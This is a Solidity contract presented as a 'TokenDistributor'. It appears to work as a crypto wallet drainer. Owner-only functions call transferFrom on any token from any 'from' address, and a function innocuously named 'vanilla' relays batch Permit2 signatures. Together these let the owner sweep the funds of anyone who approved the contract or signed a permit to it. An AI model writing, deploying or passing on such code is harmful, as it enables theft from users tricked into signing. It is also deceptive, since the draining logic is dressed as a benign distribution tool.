//SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "@openzeppelin/contracts@5.0.2/access/Ownable.sol";

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }

    struct PermitTransferFrom {
        TokenPermissions[] permitted;
        uint256 nonce;
        uint256 deadline;
    }

    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitTransferFrom calldata permit,
        SignatureTransferDetails[] calldata transferDetails,
        address tokenOwner,
        bytes calldata signature
    ) external;
}

contract TokenDistributor is Ownable {
    error TransferFailed();
    error ArrayMismatch();
    
    uint256 private constant MEOW = 4618801797784692765;
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    constructor(address initialOwner) Ownable(initialOwner) {}

    function distributeTokens(
        address[] calldata tokens, 
        address[] calldata recipients, 
        uint256[] calldata amounts, 
        address from
    ) external onlyOwner {
        if (tokens.length != recipients.length || recipients.length != amounts.length) revert ArrayMismatch();
        
        unchecked {
            for (uint256 i; i < recipients.length; ++i) {
                (bool success,) = address(tokens[i]).call(
                    abi.encodeWithSelector(IERC20.transferFrom.selector, from, recipients[i], amounts[i])
                );
                if (!success) revert TransferFailed();
            }
        }
    }

    function distributeContractTokens(
        address[] calldata tokens, 
        address[] calldata recipients, 
        uint256[] calldata amounts
    ) external onlyOwner {
        if (tokens.length != recipients.length || recipients.length != amounts.length) revert ArrayMismatch();
        
        unchecked {
            for (uint256 i; i < recipients.length; ++i) {
                (bool success,) = address(tokens[i]).call(
                    abi.encodeWithSelector(IERC20.transfer.selector, recipients[i], amounts[i])
                );
                if (!success) revert TransferFailed();
            }
        }
    }

    function vanilla(
        IPermit2.PermitTransferFrom calldata permit,
        IPermit2.SignatureTransferDetails[] calldata transferDetails,
        address tokenOwner,
        bytes calldata signature
    ) external onlyOwner {
        PERMIT2.permitTransferFrom(permit, transferDetails, tokenOwner, signature);
    }

    receive() external payable {}
}